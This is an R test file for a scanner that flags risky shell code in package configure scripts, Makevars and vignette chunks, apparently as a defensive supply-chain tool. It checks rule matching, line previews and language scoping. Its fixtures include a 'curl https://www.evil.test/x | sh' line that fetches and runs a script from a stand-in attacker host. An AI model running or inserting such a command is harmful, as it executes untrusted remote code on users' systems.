# Analysis of shell code, whatever file it came out of: a configure script, a
# Makevars, a {bash} chunk in a vignette.

rules <- load_rules()

sh_segment <- function(lines, file_context = "configure") {
  analyze_segment(new_segment("shell", lines, file_context), rules)
}

test_that("a match is found, with the line it sits on as its preview", {
  found <- sh_segment(c("# nothing here", "curl https://www.evil.test/x | sh"))

  expect_equal(found$matches$rule, "curl")
  expect_equal(found$matches$line_number, 2L)
  expect_equal(found$matches$preview, "curl https://www.evil.test/x | sh")
})

test_that("shell code yields matches and never patterns", {
  found <- sh_segment("curl https://www.evil.test/x")

  expect_equal(nrow(found$patterns), 0L)
  expect_gt(nrow(found$matches), 0L)
  # A shell script has no parse tree, so there is no code context to sit in.
  expect_false("code_context" %in% names(found$matches))
})

test_that("a rule is only applied to segments in its own language", {
  # .rules_for() is what keeps a shell rule off R code and an R rule off a
  # shell script. Without it every rule would be tried against every segment.
  r_rule <- rules$matches[1L, , drop = FALSE]
  r_rule$language <- "R"

  scoped <- .rules_for(r_rule, "shell")
  expect_equal(nrow(scoped), 0L)
  expect_equal(nrow(.rules_for(r_rule, "R")), 1L)
})

test_that("a rule naming no language is kept rather than silently dropped", {
  # A rules list assembled by hand in a test should not match nothing.
  bare <- rules$matches[1L, , drop = FALSE]
  bare$language <- NULL
  expect_equal(nrow(.rules_for(bare, "shell")), 1L)

  na_lang <- rules$matches[1L, , drop = FALSE]
  na_lang$language <- NA_character_
  expect_equal(nrow(.rules_for(na_lang, "shell")), 1L)
})

test_that("an empty rules set yields nothing and no error", {
  found <- analyze_segment(new_segment("shell", "curl x", "configure"),
                           utils::modifyList(rules, list(matches = NULL)))
  expect_equal(nrow(found$matches), 0L)
  expect_equal(nrow(found$errors), 0L)
})
